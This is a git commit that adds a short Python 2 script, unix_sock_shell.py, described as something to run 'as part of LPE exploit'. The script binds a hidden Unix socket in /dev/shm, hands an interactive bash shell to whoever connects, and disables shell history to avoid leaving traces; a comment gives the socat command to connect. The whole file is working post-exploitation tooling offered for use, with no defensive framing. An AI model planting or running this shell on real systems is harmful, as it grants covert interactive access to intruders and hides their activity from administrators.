ed76e5febd779765dc8bd2e746586b9397f4f11d
darrenmartyn <49643587+darrenmartyn@users.noreply.github.com>
2019-10-31 20:59:38 +0100

    Create unix_sock_shell.py

---
+++ unix_sock_shell.py
@@ -0,0 +1,18 @@
+#!/usr/bin/python2
+# use: run this, perhaps as part of LPE exploit or whatever.
+# to connect: socat -,echo=0,raw unix:/dev/shm/.s
+import os
+import socket
+import pty
+sockfile = "/dev/shm/.s"
+if os.path.exists(sockfile):
+  os.remove(sockfile)
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.bind(sockfile)
+s.listen(1)
+(rem, addr) = s.accept()
+os.dup2(rem.fileno(), 0)
+os.dup2(rem.fileno(), 1)
+os.dup2(rem.fileno(), 2)
+os.putenv("HISTFILE","/dev/null")
+pty.spawn("/bin/bash")
